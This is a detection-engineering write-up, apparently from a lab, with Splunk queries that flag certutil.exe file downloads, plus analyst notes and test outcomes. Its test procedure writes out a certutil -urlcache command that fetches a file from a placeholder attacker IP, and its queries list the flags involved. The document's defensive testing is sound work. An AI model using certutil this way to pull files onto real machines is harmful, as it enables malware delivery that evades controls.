# Detection 01 – Suspicious certutil file retrieval (TP4)

**Goal:** Detect potential file downloads using certutil.exe (common LOLBIN tradecraft).  
**ATT&CK:** T1218.010 – Signed Binary Proxy Execution (certutil)  
**Data Source:** Sysmon EventID 1 (Process Creation)  

---

### ✅ SPL Query (Production Detection)


index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
Image="*\\certutil.exe" 
| search CommandLine="*-urlcache*" OR CommandLine="*-split*" OR CommandLine="*-decode*" OR CommandLine="*http:*" OR CommandLine="*https:*"
| table _time host User Image CommandLine ParentImage ProcessGuid

### ✅ Hunter Compnaion (Any Certutil execution)

index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
Image="*\\certutil.exe*"
| stats count by host User ParentImage CommandLine
| sort -count

---

### 🧪 Test Procedure
1. On attacker box:
   	echo test > harmless.txt && python3 -m http.server 8000

2. On Windows Endpoint:
	certutil -urlcache -split -f http://<attacker_ip>:8000/harmless.txt C:\Temp\harmless.txt

3. Run SPL to detect activity


Analyst Notes:

| Category           | Details                                       |
| ------------------ | --------------------------------------------- |
| Legitimate Use     | Rare testing/admin tasks                      |
| FP Reduction       | Filter known admin accounts/hosts             |
| Detection Priority | Medium                                        |
| Response Actions   | Check downloaded file hash and parent process |


### Outcomes

- Splunk was not initially receiving events from sysmon, this was due to a permission error where the UF could not access the sysmon/operations channel. Swtiching the StartName to LocalSystem fixed this issue

- On initial test, Windows defender blocked the use of certutil for our test (realistic) so no logs were being forwarded to splunk.

- Tried testing over localhost instead of our attacker machine and still Defender blocked it.

- To prove the detection pipline works, I used certutil to -hashfile and validate that events show up in Splunk.

- Our Production Detection rule for certutil will remain, targeting suspicous flags, and added a companion rule just detecting broad certutil use.

